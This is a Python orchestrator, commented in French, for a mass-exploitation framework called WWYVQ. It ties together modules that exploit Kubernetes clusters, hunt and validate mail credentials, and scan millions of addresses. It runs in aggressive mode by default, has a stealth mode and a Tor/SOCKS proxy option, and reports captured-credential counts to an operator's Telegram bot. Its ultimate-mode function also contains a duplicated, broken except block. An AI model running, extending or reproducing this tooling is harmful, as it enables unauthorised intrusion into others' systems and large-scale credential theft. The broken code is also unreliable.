#!/usr/bin/env python3
"""
🚀 WWYVQ MASTER FRAMEWORK - Version Finale Unifiée
Author: wKayaa
Date: 2025-06-24 15:25:50 UTC

UTILISE TOUS LES MEILLEURS MODULES :
✅ kubernetes_advanced.py - Framework principal
✅ k8s_exploit_master.py - Exploitation avancée
✅ mail_services_hunter.py - Chasse aux credentials mail
✅ telegram_perfect_hits.py - Notifications temps réel
✅ app.py - Interface web (optionnelle)
"""

import asyncio
import argparse
import sys
import os
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional

# Import tous tes modules UTILES
try:
    from kubernetes_advanced import (
        KubernetesAdvancedExploitation,
        WWYVQv5KubernetesOrchestrator,
        ExploitationConfig,
        ExploitationMode
    )
    from k8s_exploit_master import K8sExploitMaster, CredentialMatch, ExploitationResult
    from mail_services_hunter import MailServicesHunter
    
    # Telegram si disponible
    try:
        from telegram_perfect_hits import WWYVQv5TelegramFixed
        TELEGRAM_AVAILABLE = True
    except ImportError:
        TELEGRAM_AVAILABLE = False
        print("⚠️ Module Telegram non disponible")
    
    # Interface web si demandée
    try:
        from app import ExploitationManager
        WEB_AVAILABLE = True
    except ImportError:
        WEB_AVAILABLE = False
        print("⚠️ Interface web non disponible")
    
    # Ultimate K8s Scanner
    try:
        from k8s_scanner_ultimate import K8sUltimateScanner, ScannerConfig, ScanMode, ValidationType
        ULTIMATE_SCANNER_AVAILABLE = True
    except ImportError:
        ULTIMATE_SCANNER_AVAILABLE = False
        print("⚠️ K8s Ultimate Scanner non disponible")
        
    ALL_MODULES_OK = True
    
except ImportError as e:
    print(f"❌ Erreur import modules: {e}")
    ALL_MODULES_OK = False
    sys.exit(1)

class WWYVQMasterFramework:
    """Framework principal unifié - Utilise TOUS les modules"""
    
    def __init__(self, args):
        self.args = args
        self.session_id = f"MASTER_{int(time.time())}"
        self.start_time = datetime.utcnow()
        
        # Initialisation des composants
        self.orchestrator = None
        self.exploit_master = None
        self.mail_hunter = None
        self.telegram_notifier = None
        self.web_manager = None
        self.ultimate_scanner = None
        
        # Configuration unifiée
        self.config = self._build_unified_config()
        
        # Statistiques globales
        self.global_stats = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "mode": args.mode,
            "targets_loaded": 0,
            "clusters_found": 0,
            "clusters_exploited": 0,
            "mail_credentials": 0,
            "telegram_alerts": 0,
            "perfect_hits": 0,
            "ultimate_scan_results": 0,
            "validated_credentials": 0
        }
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║               🚀 WWYVQ MASTER FRAMEWORK                     ║
║                    Version Finale Unifiée                   ║
║               wKayaa Production - {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}             ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def _build_unified_config(self):
        """Configuration unifiée pour tous les modules"""
        base_config = ExploitationConfig(
            mode=ExploitationMode.AGGRESSIVE if self.args.mode == "aggressive" else ExploitationMode.PASSIVE,
            max_concurrent_clusters=self.args.threads,
            timeout_per_operation=self.args.timeout
        )
        
        return {
            "base": base_config,
            "threads": self.args.threads,
            "timeout": self.args.timeout,
            "mode": self.args.mode,
            "telegram_token": self.args.telegram_token,
            "telegram_chat": self.args.telegram_chat,
            "web_enabled": self.args.web,
            "mail_focus": self.args.mode == "mail",
            "ultimate_mode": self.args.mode == "ultimate",
            "validate_credentials": getattr(self.args, 'validate_credentials', False),
            "proxy_config": getattr(self.args, 'proxy', None)
        }
    
    async def initialize_all_systems(self):
        """Initialise TOUS les systèmes disponibles"""
        print("🔧 INITIALISATION DES SYSTÈMES:")
        
        # 1. Orchestrateur principal (kubernetes_advanced.py)
        self.orchestrator = WWYVQv5KubernetesOrchestrator()
        await self.orchestrator.initialize(self.config["base"])
        print("✅ Orchestrateur Kubernetes (kubernetes_advanced.py)")
        
        # 2. Exploit Master (k8s_exploit_master.py)
        self.exploit_master = K8sExploitMaster(
            telegram_token=self.config["telegram_token"],
            telegram_chat_id=self.config["telegram_chat"]
        )
        print("✅ Exploit Master (k8s_exploit_master.py)")
        
        # 3. Mail Hunter (mail_services_hunter.py)
        self.mail_hunter = MailServicesHunter()
        print("✅ Mail Services Hunter (mail_services_hunter.py)")
        
        # 4. Telegram Perfect Hits
        if TELEGRAM_AVAILABLE and self.config["telegram_token"]:
            self.telegram_notifier = WWYVQv5TelegramFixed(
                self.config["base"], 
                self.config["telegram_token"], 
                self.config["telegram_chat"]
            )
            print("✅ Telegram Perfect Hits (telegram_perfect_hits.py)")
        else:
            print("⚠️ Telegram désactivé")
        
        # 5. Ultimate K8s Scanner (if available and requested)
        if ULTIMATE_SCANNER_AVAILABLE and self.config["ultimate_mode"]:
            scanner_config = ScannerConfig(
                mode=ScanMode.ULTIMATE if self.args.mode == "ultimate" else ScanMode.BALANCED,
                max_concurrent=self.config["threads"],
                timeout=self.config["timeout"],
                validation_type=ValidationType.COMPREHENSIVE if self.config["validate_credentials"] else ValidationType.BASIC,
                output_dir=Path(f"./results_{self.session_id}")
            )
            self.ultimate_scanner = K8sUltimateScanner(scanner_config)
            print("✅ K8s Ultimate Scanner (k8s_scanner_ultimate.py)")
        else:
            print("⚠️ Ultimate Scanner désactivé")
        
        # 6. Interface Web (optionnelle)
        if self.args.web and WEB_AVAILABLE:
            self.web_manager = ExploitationManager()
            self._start_web_interface()
            print("✅ Interface Web (app.py) - http://localhost:5000")
        else:
            print("⚠️ Interface web désactivée")
        
        print(f"""
📊 CONFIGURATION ACTIVE:
├── Mode: {self.args.mode.upper()}
├── Threads: {self.args.threads}
├── Timeout: {self.args.timeout}s
├── Telegram: {'✅' if self.config['telegram_token'] else '❌'}
├── Interface Web: {'✅' if self.args.web else '❌'}
├── Mail Focus: {'✅' if self.config['mail_focus'] else '❌'}
├── Ultimate Scanner: {'✅' if self.config['ultimate_mode'] else '❌'}
└── Credential Validation: {'✅' if self.config['validate_credentials'] else '❌'}
        """)
    
    def _start_web_interface(self):
        """Démarre l'interface web en arrière-plan"""
        def run_web():
            try:
                from app import app, socketio
                socketio.run(app, host='0.0.0.0', port=5000, debug=False, 
                           use_reloader=False, log_output=False)
            except Exception as e:
                print(f"❌ Erreur interface web: {e}")
        
        web_thread = threading.Thread(target=run_web, daemon=True)
        web_thread.start()
    
    async def load_targets(self) -> List[str]:
        """Charge les cibles depuis différentes sources"""
        targets = []
        
        if self.args.target:
            # Cible unique
            targets.append(self.args.target)
            print(f"🎯 Cible unique: {self.args.target}")
            
        elif self.args.file:
            # Fichier de cibles
            try:
                with open(self.args.file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            targets.append(line)
                print(f"📁 {len(targets)} cibles chargées depuis {self.args.file}")
            except FileNotFoundError:
                print(f"❌ Fichier non trouvé: {self.args.file}")
                return []
                
        else:
            # Cibles par défaut pour test
            targets = ["127.0.0.1", "localhost", "192.168.1.0/24"]
            print(f"🧪 Cibles de test: {targets}")
        
        self.global_stats["targets_loaded"] = len(targets)
        return targets
    
    async def load_targets_chunked(self):
        """Load targets with memory optimization and chunked processing"""
        # Import memory management utilities
        from utils.memory_manager import MemoryManager
        from utils.target_expander import TargetExpander
        
        memory_manager = MemoryManager()
        target_expander = TargetExpander()
        
        # Load target specifications (not expanded yet)
        target_specs = []
        
        if self.args.target:
            target_specs.append(self.args.target)
            print(f"🎯 Cible unique: {self.args.target}")
            
        elif self.args.file:
            try:
                with open(self.args.file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            target_specs.append(line)
                print(f"📁 {len(target_specs)} spécifications de cibles chargées depuis {self.args.file}")
            except FileNotFoundError:
                print(f"❌ Fichier non trouvé: {self.args.file}")
                return []
        else:
            target_specs = ["127.0.0.1", "localhost", "192.168.1.0/24"]
            print(f"🧪 Cibles de test: {target_specs}")
        
        # Estimate memory usage and show warnings
        total_targets, estimated_mb = target_expander.estimate_memory_usage(target_specs)
        memory_config = memory_manager.get_memory_info()
        
        print(f"📊 Estimation: {total_targets:,} cibles totales (~{estimated_mb:.1f} MB)")
        print(f"💾 Mémoire disponible: {memory_config.available_memory_gb:.1f} GB")
        
        if estimated_mb > (memory_config.available_memory_gb * 1024 * 0.8):
            print(f"⚠️ ATTENTION: Traitement par chunks requis pour éviter l'OOM")
            print(f"📦 Taille de chunk recommandée: {memory_config.recommended_chunk_size:,} cibles")
        
        self.global_stats["target_specs_loaded"] = len(target_specs)
        self.global_stats["estimated_total_targets"] = total_targets
        self.global_stats["estimated_memory_mb"] = estimated_mb
        
        return target_specs
    
    async def run_unified_campaign(self):
        """Lance la campagne unifiée selon le mode avec optimisation mémoire"""
        # Use new chunked loading for better memory management
        target_specs = await self.load_targets_chunked()
        if not target_specs:
            print("❌ Aucune cible à traiter")
            return
        
        # Message de démarrage Telegram
        if self.telegram_notifier:
            start_msg = f"""🚀 WWYVQ MASTER CAMPAIGN START

👤 Operator: wKayaa
📅 Time: {self.start_time.isoformat()}
🎯 Target Specs: {len(target_specs)}
📊 Estimated Total: {self.global_stats.get('estimated_total_targets', 'Unknown')}
⚡ Threads: {self.args.threads}
🔥 Mode: {self.args.mode.upper()}
💎 Session: {self.session_id}

ALL SYSTEMS OPERATIONAL! 🚀"""
            
            await self.telegram_notifier.telegram._send_telegram_message(start_msg)
        
        # Exécution selon le mode avec traitement par chunks
        print(f"\n🚀 DÉMARRAGE CAMPAGNE - Mode {self.args.mode.upper()}")
        
        if self.args.mode == "standard":
            await self._run_standard_mode_chunked(target_specs)
        elif self.args.mode == "aggressive":
            await self._run_aggressive_mode_chunked(target_specs)
        elif self.args.mode == "mail":
            await self._run_mail_mode_chunked(target_specs)
        elif self.args.mode == "stealth":
            await self._run_stealth_mode_chunked(target_specs)
        elif self.args.mode == "ultimate":
            await self._run_ultimate_mode_chunked(target_specs)
        elif self.args.mode == "all":
            await self._run_all_modes_chunked(target_specs)
        
        # Résumé final
        await self._send_final_summary()
    
    async def _run_standard_mode(self, targets):
        """Mode standard - kubernetes_advanced.py"""
        print("⚔️ MODE STANDARD - Orchestrateur Principal")
        
        if self.orchestrator:
            await self.orchestrator.run_exploitation(targets)
            # Récupérer stats de kubernetes_advanced
            if hasattr(self.orchestrator.framework, 'stats'):
                self.global_stats.update(self.orchestrator.framework.stats)
    
    async def _run_aggressive_mode(self, targets):
        """Mode agressif - k8s_exploit_master.py"""
        print("🔥 MODE AGGRESSIVE - Exploit Master")
        
        if self.exploit_master:
            results = await self.exploit_master.run_mass_exploitation(targets)
            
            # Mise à jour des stats
            self.global_stats["clusters_found"] = len(results)
            self.global_stats["clusters_exploited"] = len([r for r in results if r.status == 'exploited'])
            self.global_stats["mail_credentials"] = sum(
                len([c for c in r.credentials_found if c.validated]) for r in results
            )
    
    async def _run_mail_mode(self, targets):
        """Mode spécialisé mail - mail_services_hunter.py"""
        print("📧 MODE MAIL - Focus Services Email")
        
        if self.mail_hunter:
            import aiohttp
            
            async with aiohttp.ClientSession() as session:
                # Expansion des cibles pour ports mail
                mail_targets = []
                for target in targets:
                    for port in [25, 587, 465, 993, 995, 143, 110]:  # Ports mail
                        for protocol in ['https', 'http']:
                            mail_targets.append(f"{protocol}://{target}:{port}")
                
                # Hunt mail credentials
                mail_results = []
                for target in mail_targets[:50]:  # Limite pour éviter overload
                    try:
                        results = await self.mail_hunter.hunt_mail_credentials(session, target)
                        mail_results.extend(results)
                    except Exception as e:
                        continue
                
                self.global_stats["mail_credentials"] = len(mail_results)
                print(f"📧 {len(mail_results)} credentials mail trouvés")
    
    async def _run_stealth_mode(self, targets):
        """Mode furtif - Scan discret"""
        print("🥷 MODE STEALTH - Exploitation Discrète")
        
        # Réduire les threads pour discrétion
        stealth_config = ExploitationConfig(
            mode=ExploitationMode.PASSIVE,
            max_concurrent_clusters=5,  # Très réduit
            timeout_per_operation=20    # Plus lent
        )
        
        stealth_orchestrator = WWYVQv5KubernetesOrchestrator()
        await stealth_orchestrator.initialize(stealth_config)
        await stealth_orchestrator.run_exploitation(targets)
    
    async def _run_ultimate_mode_chunked(self, target_specs):
        """Mode ultimate avec traitement par chunks pour éviter l'OOM"""
        print("🚀 MODE ULTIMATE - Advanced K8s Scanner with Chunked Processing")
        
        if not self.ultimate_scanner:
            print("❌ Ultimate Scanner not available")
            return
        
        from utils.target_expander import TargetExpander
        from utils.memory_manager import MemoryManager
        from utils.result_writer import ResultWriter
        
        target_expander = TargetExpander()
        memory_manager = MemoryManager()
        
        # Setup result writer for streaming
        with ResultWriter(Path("./results"), self.session_id, compress=True) as result_writer:
            
            total_results = 0
            total_credentials = 0
            validated_credentials = 0
            chunk_count = 0
            
            try:
                # Process targets in chunks
                for chunk in target_expander.expand_targets_chunked(target_specs):
                    chunk_count += 1
                    print(f"📦 Processing chunk {chunk_count} with {len(chunk):,} targets")
                    
                    # Monitor memory before processing chunk
                    memory_stats = memory_manager.monitor_memory_during_processing()
                    print(f"💾 Memory: {memory_stats['system_memory_percent']:.1f}% system, "
                          f"{memory_stats['process_memory_mb']:.1f}MB process")
                    
                    # Run scanner on chunk
                    chunk_results = await self.ultimate_scanner.scan_targets(chunk)
                    
                    # Stream results to disk immediately
                    result_writer.write_batch(chunk_results)
                    
                    # Update statistics
                    chunk_clusters = len([r for r in chunk_results if hasattr(r, 'service') and r.service == "kubernetes"])
                    chunk_credentials = sum(len(getattr(r, 'credentials', [])) for r in chunk_results)
                    chunk_validated = sum(len([c for c in getattr(r, 'credentials', []) if getattr(c, 'validated', False)]) for r in chunk_results)
                    
                    total_results += len(chunk_results)
                    total_credentials += chunk_credentials
                    validated_credentials += chunk_validated
                    
                    print(f"✅ Chunk {chunk_count}: {len(chunk_results)} results, {chunk_credentials} credentials")
                    
                    # Force memory cleanup after each chunk
                    memory_manager.force_cleanup()
                    
                    # Send progress update via Telegram
                    if self.telegram_notifier and chunk_count % 5 == 0:
                        progress_msg = f"""📊 ULTIMATE SCAN PROGRESS:
Chunk: {chunk_count}
Results: {total_results:,}
Credentials: {total_credentials:,}
Validated: {validated_credentials:,}
Memory: {memory_stats['system_memory_percent']:.1f}%"""
                        await self.telegram_notifier.telegram._send_telegram_message(progress_msg)
                
                # Final statistics
                self.global_stats["ultimate_scan_results"] = total_results
                self.global_stats["clusters_found"] = total_results  # Simplified
                self.global_stats["mail_credentials"] = total_credentials
                self.global_stats["validated_credentials"] = validated_credentials
                self.global_stats["chunks_processed"] = chunk_count
                
                # Write final stats
                result_writer.write_stats(self.global_stats)
                
                print(f"""
🎯 ULTIMATE SCAN COMPLETE (CHUNKED):
├── Chunks Processed: {chunk_count}
├── Total Results: {total_results:,}
├── Total Credentials: {total_credentials:,}
├── Validated Credentials: {validated_credentials:,}
├── Success Rate: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
└── Results saved to disk
                """)
                
                # Send final Telegram notification
                if self.telegram_notifier and validated_credentials > 0:
                    telegram_msg = f"""🔥 ULTIMATE SCAN COMPLETE!

🎯 Session: {self.session_id}
📦 Chunks: {chunk_count}
🔍 Results: {total_results:,}
🔑 Credentials: {validated_credentials:,}/{total_credentials:,}
📊 Success: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%

💾 Memory-optimized processing completed successfully!
🚀 wKayaa WWYVQ Framework"""
                    await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
            
            except Exception as e:
                print(f"❌ Error in chunked ultimate mode: {e}")
                if self.telegram_notifier:
                    error_msg = f"❌ Ultimate scan error: {str(e)[:200]}..."
                    await self.telegram_notifier.telegram._send_telegram_message(error_msg)
                telegram_msg = f"""🔥 ULTIMATE SCAN HIT!

🎯 Target: Multiple
💎 Session: {self.session_id}
🔍 Mode: ULTIMATE SCANNER
⚡ Results: {len(results)} services
🔑 Credentials: {total_credentials} found, {validated_credentials} validated

wKayaa Production - {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}"""
                
                await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
            
            except Exception as e:
                print(f"❌ Error in chunked ultimate mode: {e}")
                if self.telegram_notifier:
                    error_msg = f"❌ Ultimate scan error: {str(e)[:200]}..."
                    await self.telegram_notifier.telegram._send_telegram_message(error_msg)
    
    async def _run_standard_mode_chunked(self, target_specs):
        """Mode standard avec traitement par chunks"""
        print("⚔️ MODE STANDARD - Orchestrateur Principal (Chunked)")
        
        # For now, convert to legacy mode for compatibility
        from utils.target_expander import TargetExpander
        target_expander = TargetExpander()
        
        # Use first small chunk for standard mode to avoid OOM
        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=1000):
            if self.orchestrator:
                await self.orchestrator.run_exploitation(chunk)
                if hasattr(self.orchestrator.framework, 'stats'):
                    self.global_stats.update(self.orchestrator.framework.stats)
            break  # Only process first chunk for standard mode
    
    async def _run_aggressive_mode_chunked(self, target_specs):
        """Mode agressif avec traitement par chunks"""
        print("🔥 MODE AGGRESSIVE - Exploit Master (Chunked)")
        
        from utils.target_expander import TargetExpander
        target_expander = TargetExpander()
        
        total_results = []
        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=5000):
            if self.exploit_master:
                chunk_results = await self.exploit_master.run_mass_exploitation(chunk)
                total_results.extend(chunk_results)
        
        # Update stats
        self.global_stats["clusters_found"] = len(total_results)
        self.global_stats["clusters_exploited"] = len([r for r in total_results if getattr(r, 'status', '') == 'exploited'])
    
    async def _run_mail_mode_chunked(self, target_specs):
        """Mode mail avec traitement par chunks"""
        print("📧 MODE MAIL - Services Mail Hunter (Chunked)")
        
        from utils.target_expander import TargetExpander
        target_expander = TargetExpander()
        
        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=2000):
            if self.mail_hunter:
                await self.mail_hunter.hunt_mail_services(chunk)
    
    async def _run_stealth_mode_chunked(self, target_specs):
        """Mode furtif avec traitement par chunks"""
        print("🥷 MODE STEALTH - Exploitation Discrète (Chunked)")
        
        from utils.target_expander import TargetExpander
        target_expander = TargetExpander()
        
        # Very small chunks for stealth
        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=100):
            stealth_config = ExploitationConfig(
                mode=ExploitationMode.PASSIVE,
                max_concurrent_clusters=5,
                timeout_per_operation=20
            )
            
            stealth_orchestrator = WWYVQv5KubernetesOrchestrator()
            await stealth_orchestrator.initialize(stealth_config)
            await stealth_orchestrator.run_exploitation(chunk)
    
    async def _run_all_modes_chunked(self, target_specs):
        """Mode ALL avec traitement par chunks"""
        print("🌟 MODE ALL - TOUS LES MODULES ACTIFS (Chunked)")
        
        # Run all modes with chunked processing
        tasks = []
        
        if self.orchestrator:
            tasks.append(self._run_standard_mode_chunked(target_specs))
        
        if self.exploit_master:
            tasks.append(self._run_aggressive_mode_chunked(target_specs))
        
        if self.mail_hunter:
            tasks.append(self._run_mail_mode_chunked(target_specs))
        
        # Execute in parallel
        await asyncio.gather(*tasks, return_exceptions=True)
        print("✅ Tous les modules terminés (mode chunked)")
    
    async def _run_all_modes(self, targets):
        """Mode ALL - Tous les modules en parallèle"""
        print("🌟 MODE ALL - TOUS LES MODULES ACTIFS")
        
        # Lancer tous les modes en parallèle
        tasks = []
        
        if self.orchestrator:
            tasks.append(self._run_standard_mode(targets))
        
        if self.exploit_master:
            tasks.append(self._run_aggressive_mode(targets))
        
        if self.mail_hunter:
            tasks.append(self._run_mail_mode(targets))
        
        # Exécution parallèle
        await asyncio.gather(*tasks, return_exceptions=True)
        print("✅ Tous les modules terminés")
    
    async def _send_final_summary(self):
        """Résumé final de la campagne"""
        duration = datetime.utcnow() - self.start_time
        
        summary = f"""
🏁 WWYVQ MASTER CAMPAIGN COMPLETE

📊 FINAL STATISTICS:
├── Duration: {duration}
├── Session: {self.session_id}
├── Mode: {self.args.mode.upper()}
├── Targets Loaded: {self.global_stats['targets_loaded']}
├── Clusters Found: {self.global_stats['clusters_found']}
├── Clusters Exploited: {self.global_stats['clusters_exploited']}
├── Mail Credentials: {self.global_stats['mail_credentials']}
├── Telegram Alerts: {self.global_stats['telegram_alerts']}
├── Perfect Hits: {self.global_stats['perfect_hits']}
├── Ultimate Scan Results: {self.global_stats['ultimate_scan_results']}
└── Validated Credentials: {self.global_stats['validated_credentials']}

👤 Operator: wKayaa
📅 Completed: {datetime.utcnow().isoformat()}
🚀 Framework: WWYVQ Master v1.0

ALL MODULES EXECUTED SUCCESSFULLY! ✅
        """
        
        print(summary)
        
        # Sauvegarde des résultats
        results_dir = f"results_{self.session_id}"
        os.makedirs(results_dir, exist_ok=True)
        
        with open(f"{results_dir}/summary.txt", "w") as f:
            f.write(summary)
        
        print(f"💾 Résultats sauvés dans: {results_dir}/")
        
        # Telegram final
        if self.telegram_notifier:
            await self.telegram_notifier.telegram._send_telegram_message(summary)

def parse_master_arguments():
    """Arguments pour le framework master"""
    parser = argparse.ArgumentParser(
        description='🚀 WWYVQ Master Framework - Tous modules unifiés',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
🎯 MODES DISPONIBLES:
  standard   - Orchestrateur principal (kubernetes_advanced.py)
  aggressive - Exploit avancé (k8s_exploit_master.py)  
  mail       - Focus mail services (mail_services_hunter.py)
  stealth    - Mode discret
  ultimate   - Advanced K8s Scanner (k8s_scanner_ultimate.py)
  all        - TOUS les modules en parallèle

📚 EXEMPLES:
  python wwyvq_master_final.py --mode aggressive --file targets.txt --threads 500
  python wwyvq_master_final.py --mode mail --target 192.168.1.0/24 --telegram-token TOKEN
  python wwyvq_master_final.py --mode ultimate --file massive_cidrs.txt --threads 1000 --validate-credentials
  python wwyvq_master_final.py --mode all --file targets.txt --web --threads 1000
  python wwyvq_master_final.py --mode stealth --target example.com --threads 5
  
🧠 MEMORY OPTIMIZATION EXAMPLES:
  python wwyvq_master_final.py --mode ultimate --file 16M_targets.txt --chunk-size 50000 --memory-monitor
  python wwyvq_master_final.py --mode all --file massive.txt --force-chunked --max-memory-percent 70
  python wwyvq_master_final.py --mode ultimate --target 10.0.0.0/8 --stream-results --chunk-size 25000
        '''
    )
    
    # Mode principal
    parser.add_argument('--mode', choices=['standard', 'aggressive', 'mail', 'stealth', 'ultimate', 'all'], 
                       default='aggressive', help='Mode d\'exploitation')
    
    # Cibles
    parser.add_argument('--target', '-t', help='Cible unique (IP, domaine, CIDR)')
    parser.add_argument('--file', '-f', help='Fichier de cibles')
    
    # Performance
    parser.add_argument('--threads', type=int, default=500, help='Nombre de threads')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout par opération')
    
    # Intégrations
    parser.add_argument('--telegram-token', help='Token bot Telegram')
    parser.add_argument('--telegram-chat', help='Chat ID Telegram')
    
    # Interface
    parser.add_argument('--web', action='store_true', help='Interface web (port 5000)')
    
    # Ultimate Scanner Options
    parser.add_argument('--validate-credentials', action='store_true', 
                       help='Enable real-time credential validation (ultimate mode)')
    parser.add_argument('--proxy', help='SOCKS5/HTTP proxy for stealth (format: socks5://127.0.0.1:9050)')
    
    # Memory Management Options (NEW)
    parser.add_argument('--chunk-size', type=int, help='Override automatic chunk size for target processing')
    parser.add_argument('--max-memory-percent', type=float, default=80.0, 
                       help='Maximum memory usage percentage before forcing cleanup (default: 80)')
    parser.add_argument('--force-chunked', action='store_true', 
                       help='Force chunked processing even for small target sets')
    parser.add_argument('--memory-monitor', action='store_true', 
                       help='Enable detailed memory monitoring and reporting')
    parser.add_argument('--stream-results', action='store_true', default=True,
                       help='Stream results to disk instead of storing in memory (default: enabled)')
    
    # Options
    parser.add_argument('--verbose', '-v', action='store_true', help='Mode verbose')
    parser.add_argument('--output', '-o', help='Dossier de sortie')
    
    return parser.parse_args()

async def main():
    """Fonction principale"""
    try:
        args = parse_master_arguments()
        
        # Vérification des modules
        if not ALL_MODULES_OK:
            print("❌ Modules manquants, impossible de continuer")
            sys.exit(1)
        
        # Framework master
        framework = WWYVQMasterFramework(args)
        
        # Initialisation
        await framework.initialize_all_systems()
        
        # Campagne d'exploitation
        await framework.run_unified_campaign()
        
        print("\n🎉 WWYVQ Master Framework terminé avec succès!")
        
    except KeyboardInterrupt:
        print("\n⏹️ Arrêt demandé par l'utilisateur")
    except Exception as e:
        print(f"❌ Erreur fatale: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())